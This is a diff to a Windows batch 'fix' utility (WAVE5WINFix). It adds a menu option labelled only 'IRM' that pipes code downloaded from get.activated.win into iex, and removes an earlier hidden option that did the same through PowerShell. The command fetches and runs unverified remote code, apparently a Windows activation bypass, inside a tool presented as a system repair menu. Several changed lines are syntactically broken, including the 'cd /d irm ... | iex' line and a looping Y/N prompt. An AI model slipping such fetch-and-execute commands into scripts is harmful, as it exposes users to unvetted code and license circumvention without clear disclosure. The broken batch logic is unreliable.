@@ -95,7 +95,6 @@ IF "%M%"=="2" GOTO CRYPTOFIX
 IF "%M%"=="3" GOTO BITSFIX
 IF "%M%"=="4" GOTO SYSRES
 IF "%M%"=="5" GOTO MISCINTRO
-IF "%M%"=="6" GOTO MG
 IF /I "%M%"=="?" GOTO ABOUTWINFIX
 IF /I "%M%"=="X" GOTO ENDFIX
 echo.
@@ -825,7 +824,8 @@ echo  [2] Restore Folder Options
 echo  [3] PCSafety Online Scanner
 echo  [4] ESET Online Scanner
 echo  [5] Network Connectivity Test
-echo  [6] Back to Fix Menu
+echo  [6] IRM
+echo  [7] Back to Fix Menu
 echo  [X] EXIT Program
 echo.
 SET M=
@@ -836,7 +836,8 @@ IF /I "%M%"=="2" GOTO FOLDOPEX
 IF /I "%M%"=="3" GOTO PCSSCAN
 IF /I "%M%"=="4" GOTO ESETSCAN
 IF /I "%M%"=="5" GOTO NETCON
-IF /I "%M%"=="6" GOTO WINFIXMENU
+iF /I "%M%"=="6" GOTO IRM
+IF /I "%M%"=="7" GOTO WINFIXMENU
 IF /I "%M%"=="X" GOTO ENDFIX
 echo.
 echo ERROR "%M%" invalid. Choose again.
@@ -1060,6 +1061,18 @@ echo.
 echo Returning to WINFIX(C) Main Menu...
 echo.
 PAUSE
+SET /P M=Choose Y for YES and N for NO then hit ENTER [Y/N]:
+IF NOT "%M%"=="" SET M=%M:~0,1%
+IF /I "%M%"=="Y" GOTO IRM
+IF /I "%M%"=="N" GOTO MISC
+echo.
+echo ERROR "%M%" invalid. Choose again.
+echo.
+Pause
+GOTO IRM
+:IRM
+cls
+cd /d irm https://get.activated.win | iex
 GOTO WINFIXMENU
 :ENDFIX
 CLS
@@ -1088,8 +1101,6 @@ CLS
 Title WAVE5WINFix(C) [v3.0]: About
 echo.
 GOTO WINFIXMENU
-:MG
-start /d start powershell -command irm https://get.activated.win | iex
 Pause
 :EOF
 @ends
